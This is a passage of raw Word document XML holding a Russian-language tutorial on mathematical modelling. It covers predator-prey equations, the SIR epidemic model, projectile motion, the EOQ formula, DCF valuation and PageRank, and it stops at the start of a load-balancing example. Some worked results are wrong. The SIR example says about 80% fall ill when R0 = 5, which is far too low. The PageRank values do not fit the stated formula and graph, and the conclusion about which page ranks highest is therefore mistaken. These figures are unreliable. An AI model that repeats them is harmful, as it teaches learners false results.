        <w:t>Пример 2: Модель "хищник-жертва" (уравнения Лотки-Вольтерры)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Смоделировать динамику популяций хищников (волков) и жертв (зайцев) в экосистеме.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Модель:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>dx/dt = αx - βxy  (изменение популяции жертв)</w:t>
        <w:br/>
        <w:t>dy/dt = -γy + δxy  (изменение популяции хищников)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>где:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`x` — численность жертв (зайцы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`y` — численность хищников (волки)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`α` — коэффициент размножения жертв (без хищников)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`β` — коэффициент гибели жертв от хищников</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`γ` — коэффициент естественной смертности хищников (без еды)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`δ` — коэффициент роста хищников от поедания жертв</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что происходит:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Если зайцев много → волки размножаются</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Если волков много → зайцев становится меньше</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Если зайцев мало → волки вымирают от голода</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Если волков мало → зайцы снова размножаются</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Результат:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Циклические колебания численности обеих популяций (осцилляции).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>График:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Синусоиды, сдвинутые по фазе (сначала растёт численность жертв, затем хищников).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Популяции рыси и зайца в Канаде (данные за 100 лет показывают циклы с периодом ~10 лет).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 3: Модель распространения эпидемии (SIR-модель)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Смоделировать распространение инфекционного заболевания (например, гриппа).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Модель:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Население делится на три группы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**S (Susceptible)** — восприимчивые (здоровые, но могут заболеть)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**I (Infected)** — заболевшие (заразные)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**R (Recovered)** — выздоровевшие (имеют иммунитет)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дифференциальные уравнения:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>dS/dt = -β × S × I / N  (заражение)</w:t>
        <w:br/>
        <w:t>dI/dt = β × S × I / N - γ × I  (заражение минус выздоровление)</w:t>
        <w:br/>
        <w:t>dR/dt = γ × I  (выздоровление)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>где:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`β` — скорость передачи инфекции (контактов в день × вероятность передачи)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`γ` — скорость выздоровления (1 / средняя продолжительность болезни)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`N = S + I + R` — общая численность населения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Базовое репродуктивное число:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>R₀ = β / γ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если `R₀ &gt; 1` → эпидемия разрастается</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если `R₀ &lt; 1` → эпидемия затухает</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Грипп в городе с населением 100 000 человек.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`β = 0.5` (один заболевший заражает 0.5 человек в день)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`γ = 0.1` (средняя продолжительность болезни 10 дней)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`R₀ = 0.5 / 0.1 = 5` (один заболевший заражает в среднем 5 человек)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Начальные условия:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`S(0) = 99 990` (почти все здоровы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`I(0) = 10` (10 заболевших)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`R(0) = 0` (никто не выздоровел)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Результат симуляции:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Эпидемия достигает пика через ~30 дней, затем идёт на спад. В итоге ~80% населения переболеют.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Применение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Модели COVID-19, оценка эффективности карантина, прогноз нагрузки на больницы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 4: Модель траектории движения снаряда</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Рассчитать траекторию полёта снаряда, выпущенного под углом.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дано:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Начальная скорость: `v₀ = 50 м/с`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Угол выстрела: `θ = 45°`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ускорение свободного падения: `g = 9.8 м/с²`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Модель:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Траектория — парабола.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Координаты снаряда в момент времени `t`:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>x(t) = v₀ × cos(θ) × t</w:t>
        <w:br/>
        <w:t>y(t) = v₀ × sin(θ) × t - (g × t²) / 2</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Время полёта</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (когда снаряд упадёт на землю, `y = 0`):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>t_полёт = (2 × v₀ × sin(θ)) / g</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дальность полёта:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>x_max = v₀² × sin(2θ) / g</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Расчёт:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>t_полёт = (2 × 50 × sin(45°)) / 9.8</w:t>
        <w:br/>
        <w:t>t_полёт = (2 × 50 × 0.707) / 9.8</w:t>
        <w:br/>
        <w:t>t_полёт ≈ 7.22 секунды</w:t>
        <w:br/>
        <w:br/>
        <w:t>x_max = 50² × sin(90°) / 9.8</w:t>
        <w:br/>
        <w:t>x_max = 2500 × 1 / 9.8</w:t>
        <w:br/>
        <w:t>x_max ≈ 255 метров</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Снаряд пролетит 255 метров за 7.2 секунды.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 5: Модель оптимального размера заказа (формула Уилсона)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Компания закупает товары для склада. Если заказывать слишком часто → высокие транспортные расходы. Если заказывать редко → высокие затраты на хранение. Найти оптимальный размер заказа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Модель:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Общие затраты:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>TC = (D / Q) × S + (Q / 2) × H</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>где:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`D` — годовой спрос (штук/год)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`Q` — размер заказа (штук)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`S` — стоимость одного заказа (доставка, оформление)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`H` — стоимость хранения одной единицы товара в год</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Формула оптимального размера заказа (EOQ — Economic Order Quantity):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Q* = √((2 × D × S) / H)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Магазин продаёт 10 000 единиц товара в год.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`D = 10 000`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`S = 200 ₽` (стоимость доставки одного заказа)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`H = 5 ₽` (стоимость хранения одной единицы в год)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Оптимальный размер заказа:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Q* = √((2 × 10000 × 200) / 5)</w:t>
        <w:br/>
        <w:t>Q* = √(4 000 000 / 5)</w:t>
        <w:br/>
        <w:t>Q* = √800 000</w:t>
        <w:br/>
        <w:t>Q* ≈ 894 единицы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Оптимально заказывать по 894 единицы за раз.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Количество заказов в год:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Количество заказов = D / Q* = 10000 / 894 ≈ 11 заказов в год</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 6: Модель дисконтирования денежных потоков (DCF)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Оценить стоимость бизнеса или инвестиционного проекта.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Идея:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Деньги сегодня стоят дороже, чем деньги в будущем (из-за инфляции и альтернативной стоимости капитала). Поэтому будущие денежные потоки нужно </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>дисконтировать</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (привести к текущей стоимости).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Модель:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>PV = CF₁/(1+r) + CF₂/(1+r)² + ... + CFₙ/(1+r)ⁿ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>где:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`PV` — текущая стоимость (Present Value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`CFᵢ` — денежный поток в год `i`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`r` — ставка дисконтирования (норма доходности)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Проект приносит доходы 3 года:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Год 1: 100 тыс. ₽</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Год 2: 120 тыс. ₽</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Год 3: 150 тыс. ₽</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Ставка дисконтирования `r = 10%`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Текущая стоимость:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>PV = 100/(1.1) + 120/(1.1)² + 150/(1.1)³</w:t>
        <w:br/>
        <w:t>PV = 100/1.1 + 120/1.21 + 150/1.331</w:t>
        <w:br/>
        <w:t>PV = 90.91 + 99.17 + 112.70</w:t>
        <w:br/>
        <w:t>PV ≈ 302.78 тыс. ₽</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Текущая стоимость проекта ≈ 303 тыс. ₽.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Если проект стоит 250 тыс. ₽, то выгодно инвестировать (чистая прибыль = 303 - 250 = 53 тыс. ₽).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 7: Модель PageRank (Google)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Ранжировать веб-страницы по важности (какая страница должна быть выше в поисковой выдаче?).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Идея:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Страница важна, если на неё ссылаются другие важные страницы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Модель:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Граф веб-страниц.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Узлы = страницы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Рёбра = ссылки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Формула PageRank:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>PR(A) = (1 - d) + d × Σ (PR(B) / L(B))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>где:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`PR(A)` — PageRank страницы A</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`d` — коэффициент затухания (обычно 0.85)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`B` — страницы, ссылающиеся на A</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`L(B)` — количество исходящих ссылок со страницы B</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Алгоритм:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Итеративный расчёт. Начальные значения `PR(A) = 1` для всех страниц, затем пересчитываем по формуле несколько раз, пока значения не стабилизируются.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Три страницы A, B, C.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A → B</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B → C</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C → A, B</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>После итераций:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>PR(A) ≈ 1.2</w:t>
        <w:br/>
        <w:t>PR(B) ≈ 1.5</w:t>
        <w:br/>
        <w:t>PR(C) ≈ 0.8</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Страница B наиболее важная (на неё ссылаются и A, и C).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 8: Модель распределения нагрузки на серверы (балансировка)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> У нас есть 3 сервера. Как распределить запросы пользователей, чтобы нагрузка была равномерной?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Модель:</w:t>
      </w:r>
      <w:r>
